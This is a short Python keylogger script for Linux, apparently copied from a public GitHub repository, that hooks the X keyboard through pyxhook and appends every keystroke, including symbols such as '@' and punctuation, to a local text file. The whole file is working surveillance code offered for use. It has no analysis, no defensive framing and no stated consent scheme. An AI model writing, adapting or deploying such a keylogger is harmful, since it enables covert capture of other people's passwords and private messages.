#!/usr/bin/python3
# From: https://github.com/nandydark/Linux-keylogger
import os
import pyxhook
  

log_file = os.environ.get(
    'pylogger_file',
    os.path.expanduser('/home/user/Downloads/Keylogger.txt')
)

cancel_key = ord(
    os.environ.get(
        'pylogger_cancel',
        '`'
    )[0]
)
  
if os.environ.get('pylogger_clean', None) is not None:
    try:
        os.remove(log_file)
    except EnvironmentError:
       # File does not exist, or no permissions.
        pass
  

def OnKeyPress(event):
    with open(log_file, 'a') as f:
        if event.Key == 'Return':
            f.write('\n')
        elif event.Key == 'Delete':
            f.write('Supr')
        elif event.Key == 'BackSpace':
            f.write('Del')
        elif event.Key == 'at':
            f.write('@')
        elif event.Key == 'exclam':
            f.write('!')
        elif event.Key == 'period':
            f.write('.')
        elif event.Key == 'comma':
            f.write(',')
        elif event.Key == 'colon':
            f.write(':')
        elif event.Key == 'semicolon':
            f.write(';')
        elif event.Key == 'parenright':
            f.write(')')
        elif event.Key == 'parenleft':
            f.write('(')
        elif event.Key == 'equal':
            f.write('=')
        elif event.Key == 'space':
            f.write(' ')
        elif event.Key == 'Super_R':
            pass
        elif event.Key == 'Super_L':
            pass
        elif event.Key == 'Shift_R':
            pass
        elif event.Key == 'Shift_L':
            pass
        elif event.Key == 'Control_L':
            pass
        elif event.Key == 'Control_R':
            pass
        elif event.Key == 'Alt_L':
            pass
        elif event.Key == '@':
            pass
        elif event.Key == 'Caps_Lock':
            pass
        elif event.Key == '[65027]':
            pass
        else:
            f.write('{}'.format(event.Key))
  

new_hook = pyxhook.HookManager()
new_hook.KeyDown = OnKeyPress
new_hook.HookKeyboard()
try:
    new_hook.start()
except KeyboardInterrupt:
    pass
except Exception as ex:
    msg = 'Error while catching events:  {}'.format(ex)
    pyxhook.print_err(msg)
    with open(log_file, 'a') as f:
        f.write('{}'.format(msg))